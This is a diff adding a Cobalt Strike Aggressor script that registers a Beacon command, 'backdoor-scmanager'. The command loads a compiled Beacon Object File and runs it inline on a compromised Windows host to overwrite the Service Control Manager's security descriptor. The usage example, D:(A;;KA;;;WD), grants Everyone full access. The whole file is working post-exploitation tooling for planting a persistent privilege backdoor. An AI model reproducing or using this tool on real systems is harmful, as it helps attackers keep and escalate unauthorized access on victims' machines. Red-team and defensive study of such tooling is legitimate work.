@@ -1,0 +1,22 @@
+alias backdoor-scmanager {
+    local('$arch $handle $bof $args');
+
+    $arch   = barch($1);
+
+    $handle = openf(script_resource("dist/backdoor-scmanager. $+ $arch $+ .o"));
+    $bof    = readb($handle, -1);
+    closef($handle);
+
+    $args   = bof_pack($1, "z", $2);
+
+    btask($1, "Running BackdoorSCManager BOF");
+
+    beacon_inline_execute($1, $bof, "go", $args);
+}
+
+beacon_command_register(
+"backdoor-scmanager",
+"Backdoors SCManager SDDL",
+"\
+usage:    backdoor-scmanager <SDDL_TO_SET>\
+example:  backdoor-scmanager D:(A;;KA;;;WD)");
